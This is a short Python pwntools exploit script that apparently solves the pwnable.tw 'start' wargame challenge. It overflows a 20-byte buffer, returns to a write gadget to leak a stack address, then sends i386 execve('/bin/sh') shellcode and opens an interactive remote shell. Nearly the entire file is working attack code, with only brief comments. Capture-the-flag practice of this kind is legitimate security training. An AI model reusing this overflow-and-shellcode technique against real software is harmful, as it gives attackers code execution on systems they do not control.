#!/bin/python3

from pwn import *

context(os='linux', arch='i386')

ip_addr = "chall.pwnable.tw"
port = 10000
initial_string_len = 0x14
stack_offset = initial_string_len
pre_write_address = 0x08048087
stack_address_recv= 0
context.update(arch='i386', os='linux')

shell_code = asm('\n'.join([
                  'push 0xb\n'        # execve syscall number
                  'pop eax\n'         # store in eax
                  'push 0\n'
                  'push 0x68732f2f\n'
                  'push 0x6e69622f\n' # push /bin/sh\0
                  'mov ebx,esp\n'     # store the string address on ebx
                  'mov ecx, 0\n'      # reset ecx
                  'mov edx, 0\n'      # reset edx
                  'int 0x80\n',     
                  ]))

# connects to the target
connection = remote(ip_addr, port)
print("[+] Connected to: " + ip_addr)
print("[+] Received    : " + str(connection.recv(initial_string_len)))
print("[+] Sending <shellcode> + " + str(hex(pre_write_address)))
# Sends the shellcode and the return to write address
connection.send(b"A"*initial_string_len + p32(pre_write_address))
stack_address_recv = u32(connection.recv(4))
# Received the stack pointer
print("[+] Received stack address:" + str(hex(stack_address_recv)))
# Calculate the shellcode address
stack_address_recv = stack_address_recv + stack_offset
print("[+] The shellcode is at:" + str(hex(stack_address_recv)))
print("[+] Sends 20 bytes + shellcode address")
connection.send(b'A'*initial_string_len + p32(stack_address_recv) + shell_code)
# shell
connection.interactive()
